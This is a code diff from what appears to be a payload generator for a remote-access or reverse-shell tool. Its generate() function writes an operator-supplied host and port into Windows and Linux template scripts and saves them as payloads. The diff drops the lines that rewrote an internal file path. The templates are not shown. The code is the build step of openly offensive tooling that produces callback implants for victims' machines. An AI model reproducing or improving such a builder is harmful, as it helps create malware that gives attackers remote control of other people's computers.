@@ -43,13 +43,10 @@ def generate(data=''):
             for line in fileinput.input(r'sources/templates/win.py', inplace=True):
                 l1 = "host = ip"
                 l2 = "port = prt"
-                l3 = "call = os.path.join(os.getcwd(), 'win.py')"
                 if l1 in line:
                     line = line.replace(l1, f"host = '{host}'")
                 if l2 in line:
                     line = line.replace(l2, f"port = {port}")
-                if l3 in line:
-                    line = line.replace(l3, f"call = os.path.join(os.getcwd(), '{name}')")
                 sys.stdout.write(line)
             subprocess.run(f'move sources\\templates\\win.py "{path}"', capture_output=True, shell=True)
             print(f"Windows Payload generated and saved as '{path}'")
@@ -64,13 +61,10 @@ def generate(data=''):
             for line in fileinput.input(r'sources/templates/linux.py', inplace=True):
                 l1 = "host = ip"
                 l2 = "port = prt"
-                l3 = "call = os.path.join(os.getcwd(), 'linux.py')"
                 if l1 in line:
                     line = line.replace(l1, f"host = '{host}'")
                 if l2 in line:
                     line = line.replace(l2, f"port = {port}")
-                if l3 in line:
-                    line = line.replace(l3, f"call = os.path.join(os.getcwd(), '{name}')")
                 sys.stdout.write(line)
             subprocess.run(f'move sources\\templates\\linux.py "{path}"', capture_output=True, shell=True)
             print(f"Linux Payload generated and saved as '{path}'")
